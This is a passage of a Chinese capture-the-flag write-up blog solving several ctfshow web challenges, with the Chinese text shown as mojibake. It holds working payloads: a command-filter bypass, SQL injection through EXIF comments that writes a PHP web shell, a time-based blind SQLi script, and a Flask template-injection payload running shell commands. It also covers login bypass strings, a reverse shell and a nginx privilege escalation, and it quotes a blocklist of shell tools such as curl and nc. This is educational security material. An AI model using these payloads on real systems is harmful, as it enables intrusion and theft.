$numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;éæ´²æ¬¢è¿ä½ 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;nl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[&#x27;\*\&quot;[?]/&quot;</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;éé¢„æœŸä¿®å¤*2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">å»éæ´²å§</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> var_dump(<span class="number">99999999999999999.99999999999999999</span>==<span class="number">99999999999999999</span>);</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;0.</span><br><span class="line">?num&#x3D;99999999999999999.999999999999999990</span><br></pre></td></tr></table></figure><p>æ¥ç€ä¸€æ ·ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t%09&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t%09&#96;ls&#96;</span><br></pre></td></tr></table></figure><h3 id="WEBä½ æ²¡è§è¿‡çš„æ³¨å…¥36Dæ¯"><a href="#WEBä½ æ²¡è§è¿‡çš„æ³¨å…¥36Dæ¯" class="headerlink" title="WEBä½ æ²¡è§è¿‡çš„æ³¨å…¥36Dæ¯"></a>WEBä½ æ²¡è§è¿‡çš„æ³¨å…¥36Dæ¯</h3><p>æç¤ºè®¿é—®<code>robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;pwdreset.php</span><br></pre></td></tr></table></figure><p>æˆåŠŸé‡ç½®<code>admin</code>çš„å¯†ç ï¼Œç™»é™†ä¹‹åå‘ç°æ˜¯ä¸ªä¸Šä¼ ï¼Œæ¥ç€å‘ç°ä¸Šä¼ æ‰€æœ‰æ–‡ä»¶éƒ½å˜æˆ<code>.zip</code>äº†ï¼Œå¹¶ä¸”æœ‰æ–‡ä»¶å±æ€§ç›¸å…³ä¿¡æ¯</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918194127.png"></p><p>å‘ç°å’Œ<code>file</code>å‘½ä»¤è¾“å‡ºä¸€æ ·</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918194424.png"></p><p>æ¥ç€å°±æ˜¯<code>EXIF</code>å¤´æ³¨å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>exiftool</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="string">&quot;test&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918201317.png"></p><p>å†ä¸Šä¼ å‘ç°</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918201627.png"></p><p>è¯•æƒ³æœ‰å¯èƒ½å­˜åˆ°æ•°æ®åº“é‡Œï¼ŒçŒœåå°sql:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">column</span>(<span class="keyword">name</span>, <span class="keyword">type</span>, lineFeed) <span class="keyword">values</span> ($filename, $filetype, $filelinefeed);</span><br></pre></td></tr></table></figure><p>å°è¯•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="string">&quot;test\&quot;&#x27;);select sleep(10);&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure><p>å‘ç°æˆåŠŸå»¶æ—¶äº†ï¼Œç›´æ¥å†™ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment&#x3D;&quot;test\&quot;&#39;);select 0x3c3f706870206576616c28245f504f53545b315d293b into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;&quot; 1.jpg</span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200918211349.png"></p><p>å‘ç°éƒ¨åˆ†å†…å®¹æ²¡å†™ä¸Š ä¼°è®¡æœ‰é•¿åº¦é™åˆ¶ï¼Œç”¨çŸ­æ ‡ç­¾ç¼©çŸ­é•¿åº¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="string">&quot;test\&quot;&#x27;);select 0x3c3f3d60245f504f53545b315d603b into outfile &#x27;/var/www/html/1.php&#x27;;&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure><p>hexéƒ¨åˆ†æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`$_POST[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure><h3 id="web1ç­¾åˆ°å†…éƒ¨èµ›"><a href="#web1ç­¾åˆ°å†…éƒ¨èµ›" class="headerlink" title="web1ç­¾åˆ°å†…éƒ¨èµ›"></a>web1ç­¾åˆ°å†…éƒ¨èµ›</h3><p>æŸ¥çœ‹æºç å‘ç°<code>register.php</code>ï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œbanäº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and | sleep ç©ºæ ¼ &amp; if ascii</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://8d1e1a44-371c-4be6-ae98-326ebebbff39.chall.ctf.show/register.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;</span>.format(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))=&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;</span>.format(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;e&#x27;</span>:p1,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;e&#x27;</span>:p2,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data2,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data1,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># web</span></span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨å‡ºæ•°æ®åº“ï¼Œä½†æ˜¯å¥½åƒä¸èƒ½æŸ¥information_schema</p><h3 id="web03å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯-jpgå†…éƒ¨èµ›"><a href="#web03å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯-jpgå†…éƒ¨èµ›" class="headerlink" title="web03å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯.jpgå†…éƒ¨èµ›"></a>web03å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯.jpgå†…éƒ¨èµ›</h3><p>çœ‹åˆ°åˆ€ä¸Šæœ‰caiå­—æ ·ï¼Œç›²çŒœæ˜¯ä¸€å¥è¯å¯†ç ï¼Œèšå‰‘è¿ä¸Šï¼Œæœ‰ä¸¤ä¸ªhint:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint1: whoami &amp;&amp; ls -l &#x2F;</span><br><span class="line"></span><br><span class="line">hint2:å¦‚ä½ ä»¬æ‰€è¯´ï¼Œææƒï¼Œçœ‹çœ‹æœåŠ¡å™¨æœ‰ä»€ä¹ˆæœåŠ¡</span><br></pre></td></tr></table></figure><p><code>ps -aux</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.0  0.0  17960   636 ?        Ss   12:27   0:00 /bin/sh /usr/<span class="built_in">local</span>/bin/docker-php-entrypoint</span><br><span class="line">root        11  0.0  0.0  23656   592 ?        Ss   12:27   0:00 /usr/sbin/cron</span><br><span class="line">root        12  0.0  0.0   4384     4 ?        S    12:27   0:00 tail -F /dev/null</span><br><span class="line">root        13  0.0  0.0 133628  2036 ?        Ss   12:27   0:00 php-fpm: master process (/etc/php5/fpm/php-fpm.conf)</span><br><span class="line">www-data    14  0.0  0.0 134104  6360 ?        S    12:27   0:00 php-fpm: pool www</span><br><span class="line">www-data    15  0.0  0.0 134120  5132 ?        S    12:27   0:00 php-fpm: pool www</span><br><span class="line">root        16  0.0  0.0  85888  1084 ?        Ss   12:27   0:00 nginx: master process nginx</span><br><span class="line">www-data    17  0.0  0.0  86524  1852 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data    18  0.0  0.0  86184  1364 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data    19  0.0  0.0  86528  2140 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data    20  0.0  0.0  86184  1328 ?        S    12:27   0:00 nginx: worker process</span><br><span class="line">www-data   143  0.0  0.0 133628  7436 ?        S    12:40   0:00 php-fpm: pool www</span><br><span class="line">www-data   159  0.0  0.0  17952  2856 ?        S    12:42   0:00 sh -c /bin/sh -c <span class="string">&quot;cd &quot;</span>/<span class="string">&quot;;ps -aux;echo [S];pwd;echo [E]&quot;</span> 2&gt;&amp;1</span><br><span class="line">www-data   160  0.0  0.0  17956  2848 ?        S    12:42   0:00 /bin/sh -c <span class="built_in">cd</span> /;ps -aux;<span class="built_in">echo</span> [S];<span class="built_in">pwd</span>;<span class="built_in">echo</span> [E]</span><br><span class="line">www-data   161  0.0  0.0  15568  2116 ?        R    12:42   0:00 ps -aux</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸ªæ•æ„Ÿæ–‡ä»¶<code>/usr/local/bin/docker-php-entrypoint</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;FLAG&#125;</span> &gt; /flag</span><br><span class="line"></span><br><span class="line">chown -R root:root /flag</span><br><span class="line">chmod 700 /flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"></span><br><span class="line">php5-fpm &amp;</span><br><span class="line"></span><br><span class="line">nginx &amp;</span><br><span class="line"></span><br><span class="line">/usr/sbin/cron</span><br><span class="line"></span><br><span class="line">tail -F /dev/null</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”nginxçš„æŸä¸ªè¿›ç¨‹æ˜¯ä»¥rootè¿è¡Œçš„ï¼Œæœäº†ä¸‹å‘ç°<code>CVE-2016-1247</code></p><p>bashåå¼¹shellï¼Œå°†pocä¼ åˆ°<code>/tmp</code>ç›®å½•ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.seebug.org&#x2F;vuldb&#x2F;ssvid-92538</span><br></pre></td></tr></table></figure><p>å¦‚æœä»¥ä¸‹æŠ¥é”™</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200917213053.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/\r//&quot;</span> poc</span><br></pre></td></tr></table></figure><p>ç­‰ä¼šå°±å¥½äº†</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200917213959.png"></p><h3 id="web2è“ç˜¦å†…éƒ¨èµ›"><a href="#web2è“ç˜¦å†…éƒ¨èµ›" class="headerlink" title="web2è“ç˜¦å†…éƒ¨èµ›"></a>web2è“ç˜¦å†…éƒ¨èµ›</h3><p>æŸ¥çœ‹æºç æœ‰ä¸¤ä¸ªhint:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- param: ctfshow --&gt;</span><br><span class="line">&lt;!-- key: ican --&gt;</span><br></pre></td></tr></table></figure><p>çŒœæµ‹åˆ†åˆ«æ˜¯å‚æ•°ï¼Œflask keyçš„æ„æ€</p><p>ä¼ªé€ session</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200929141453.png"></p><p>æ¥ç€å°±å¯ä»¥ä¼ å‚æ•°ssti,pç¥çš„payloadç›´æ¥å¯ä»¥æ‰“ï¼Œflagåœ¨ç¯å¢ƒå˜é‡é‡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;env&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="web4ä¸€è§ˆæ— ä½™-å†…éƒ¨èµ›"><a href="#web4ä¸€è§ˆæ— ä½™-å†…éƒ¨èµ›" class="headerlink" title="web4ä¸€è§ˆæ— ä½™_å†…éƒ¨èµ›"></a>web4ä¸€è§ˆæ— ä½™_å†…éƒ¨èµ›</h3><p>ç›´æ¥ç»™å‡ºæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™å•¥ä¹Ÿæ²¡æœ‰å•Šï¼Œçœ‹äº†çœ‹ç½‘ç«™å®¹å™¨æ˜¯nginxï¼ŒçŒœæµ‹æ˜¯ï¼š<a href="https://moonback1314.gitee.io/2020/05/05/Vulhub%E4%B9%8Bphp/#CVE-2019-11043">https://moonback1314.gitee.io/2020/05/05/Vulhub%E4%B9%8Bphp/#CVE-2019-11043</a></p><p>è¯•äº†è¯•ï¼Œæœç„¶æ˜¯ï¼Œä¸è¿‡æ‰§è¡Œå‘½ä»¤æ—¶æœ‰æ—¶å€™ä¼šä¸æˆåŠŸï¼Œflagåœ¨ç½‘ç«™ç›®å½•</p><h3 id="web5ç™»é™†å°±æœ‰flag-å†…éƒ¨èµ›"><a href="#web5ç™»é™†å°±æœ‰flag-å†…éƒ¨èµ›" class="headerlink" title="web5ç™»é™†å°±æœ‰flag_å†…éƒ¨èµ›"></a>web5ç™»é™†å°±æœ‰flag_å†…éƒ¨èµ›</h3><p>è²Œä¼¼ä¸‡èƒ½å¯†ç é¢˜ï¼Œéšä¾¿åŠ ä¸ªä¸œè¥¿å‘ç°æç¤ºå¤ªé•¿äº†ï¼Œåº”è¯¥æ˜¯é•¿åº¦é™åˆ¶ï¼Œç›´æ¥ä¸‹é¢éƒ½è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u&#x3D;&#39;^&#39;&#39;#&amp;p&#x3D;1</span><br><span class="line">u&#x3D;&#39;^0#&amp;p&#x3D;1</span><br><span class="line">u&#x3D;&#39;%260#&amp;p&#x3D;1</span><br><span class="line">u&#x3D;&#39;%261#&amp;p&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="web6ç­¾é€€å†…éƒ¨èµ›"><a href="#web6ç­¾é€€å†…éƒ¨èµ›" class="headerlink" title="web6ç­¾é€€å†…éƒ¨èµ›"></a>web6ç­¾é€€å†…éƒ¨èµ›</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($S = $_GET[<span class="string">&#x27;S&#x27;</span>])?<span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$S</span>&quot;</span>):highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?S&#x3D;&#123;system(&#39;cat ..&#x2F;..&#x2F;flag.txt&#39;)&#125;;</span><br></pre></td></tr></table></figure><h3 id="web2-è§‚æ˜Ÿ"><a href="#web2-è§‚æ˜Ÿ" class="headerlink" title="web2_è§‚æ˜Ÿ"></a>web2_è§‚æ˜Ÿ</h3><p>è¿‡æ»¤äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">, ascii ç©ºæ ¼ &#x3D; like and</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(case<span class="comment">/**/</span>when<span class="comment">/**/</span>ord(substr((<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span 